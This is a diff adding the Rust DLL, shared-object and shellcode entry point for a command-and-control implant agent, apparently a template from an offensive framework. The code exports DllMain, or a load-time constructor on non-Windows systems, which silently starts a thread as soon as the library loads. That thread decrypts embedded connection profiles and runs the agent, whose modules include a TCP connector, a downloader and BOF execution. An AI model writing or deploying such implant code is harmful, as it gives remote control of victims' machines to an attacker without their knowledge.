@@ -1,0 +1,82 @@
+// __NAME__ Agent — DLL Entry Point (adaptix_gopher protocol)
+//
+// This file provides the cdylib entry for DLL / Shared Object / Shellcode
+// builds.  On Windows it exports DllMain which spawns the agent on a
+// background thread.  On non-Windows targets it exposes a constructor
+// attribute that achieves the same.
+
+mod config;
+mod crypto;
+mod protocol;
+mod agent;
+mod commander;
+mod runtime_common;
+mod runtime_fs;
+mod runtime_response;
+mod connector_tcp;
+mod jobs;
+mod downloader;
+mod bof;
+// __EVASION_MOD__
+
+#[cfg(windows)]
+#[no_mangle]
+pub extern "system" fn DllMain(
+    _dll_module: usize,
+    call_reason: u32,
+    _reserved: usize,
+) -> i32 {
+    const DLL_PROCESS_ATTACH: u32 = 1;
+    if call_reason == DLL_PROCESS_ATTACH {
+        std::thread::spawn(|| {
+            for blob in config::ENC_PROFILES {
+                if blob.len() <= crypto::KEY_SIZE {
+                    continue;
+                }
+
+                let key = blob[..crypto::KEY_SIZE].to_vec();
+                let profile_bytes = match crypto::decrypt(&blob[crypto::KEY_SIZE..], &key) {
+                    Ok(bytes) => bytes,
+                    Err(_) => continue,
+                };
+
+                let profile: protocol::Profile = match protocol::unmarshal(&profile_bytes) {
+                    Ok(profile) => profile,
+                    Err(_) => continue,
+                };
+
+                let mut instance = agent::Agent::new(profile);
+                instance.session_key = key;
+                instance.run();
+            }
+        });
+    }
+    1 // TRUE
+}
+
+#[cfg(not(windows))]
+#[ctor::ctor]
+fn _init() {
+    std::thread::spawn(|| {
+        for blob in config::ENC_PROFILES {
+            if blob.len() <= crypto::KEY_SIZE {
+                continue;
+            }
+
+            let key = blob[..crypto::KEY_SIZE].to_vec();
+            let profile_bytes = match crypto::decrypt(&blob[crypto::KEY_SIZE..], &key) {
+                Ok(bytes) => bytes,
+                Err(_) => continue,
+            };
+
+            let profile: protocol::Profile = match protocol::unmarshal(&profile_bytes) {
+                Ok(profile) => profile,
+                Err(_) => continue,
+            };
+
+            let mut instance = agent::Agent::new(profile);
+            instance.session_key = key;
+            instance.run();
+        }
+    });
+}
